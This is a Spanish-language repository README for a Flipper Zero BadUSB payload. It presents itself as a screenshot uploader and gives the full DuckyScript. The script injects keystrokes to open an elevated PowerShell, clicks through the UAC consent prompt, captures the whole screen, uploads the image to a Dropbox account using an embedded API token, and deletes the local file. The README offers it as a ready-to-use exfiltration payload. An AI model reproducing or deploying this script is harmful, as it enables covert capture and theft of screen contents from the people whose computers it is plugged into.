# Dropbox Screenshot Uploader

Este proyecto contiene un payload para el Flipper Zero que toma una captura de pantalla en un sistema Windows y la sube a Dropbox utilizando PowerShell.

## Autor

- **mrflippermen**

## Descripción

Este payload está diseñado para sistemas Windows. El script realiza las siguientes acciones:
1. Abre PowerShell con permisos elevados.
2. Toma una captura de pantalla.
3. Sube la captura de pantalla a Dropbox.
4. Elimina el archivo temporal de la captura.

## Requisitos

- Flipper Zero
- Token de API de Dropbox
- Sistema operativo Windows

## Instalación

1. Clona o descarga este repositorio.
2. Abre el script en tu editor de texto preferido.
3. Reemplaza el marcador `"DROPBOX_API_TOKEN_HERE"` con tu token de API de Dropbox.
4. Guarda los cambios.

## Uso

1. Asegúrate de que PowerShell está instalado en tu sistema Windows.
2. Ejecuta el payload en tu Flipper Zero.
3. Observa cómo se abre PowerShell, toma una captura de pantalla y la sube a Dropbox.

## Script

```plaintext
REM Autor: mrflippermen 
REM Descripción: Este payload toma una captura de pantalla y la sube a Dropbox.
REM Sistema: Windows

DELAY 750
WINDOWS d
DELAY 1500
WINDOWS r
DELAY 1500

REM Abre PowerShell con permisos elevados
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000

REM Aceptar el prompt de Control de Cuentas de Usuario (UAC)
ALT LEFTARROW
DELAY 1000
ALT ENTER
DELAY 2000

REM Espera a que la ventana de PowerShell con permisos elevados esté lista
DELAY 1000

REM Establecer el token de API de Dropbox
STRING $db = "DROPBOX_API_TOKEN_HERE";
ENTER

REM Función para subir un archivo a Dropbox
STRING function DropBox-Upload {
ENTER
STRING     param (
ENTER
STRING         [string]$SourceFilePath
ENTER
STRING     )
ENTER
STRING     $outputFile = Split-Path $SourceFilePath -leaf;
ENTER
STRING     $TargetFilePath = "/$outputFile";
ENTER
STRING     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }';
ENTER
STRING     $authorization = "Bearer " + $db;
ENTER
STRING     $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]";
ENTER
STRING     $headers.Add("Authorization", $authorization);
ENTER
STRING     $headers.Add("Dropbox-API-Arg", $arg);
ENTER
STRING     $headers.Add("Content-Type", 'application/octet-stream');
ENTER
STRING     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers;
ENTER
STRING }
ENTER

REM Cargar System.Windows.Forms y tomar una captura de pantalla
STRING Add-Type -AssemblyName System.Windows.Forms;
ENTER
STRING $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;
ENTER
STRING $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;
ENTER
STRING $graphics = [System.Drawing.Graphics]::FromImage($bitmap);
ENTER
STRING $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size);
ENTER

REM Guardar la captura de pantalla en un archivo temporal
STRING $filePath = "$env:temp\sc.png";
ENTER
STRING $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png);
ENTER
STRING $graphics.Dispose();
ENTER
STRING $bitmap.Dispose();
ENTER

REM Subir la captura de pantalla a Dropbox
STRING DropBox-Upload -SourceFilePath $filePath;
ENTER

REM Eliminar el archivo temporal
STRING Remove-Item -Path $filePath;
ENTER

REM Salir del script
STRING exit
ENTER
plaintext```

##Contribuir

Las contribuciones son bienvenidas. Puedes hacer un fork del repositorio y enviar un pull request con tus mejoras o correcciones.
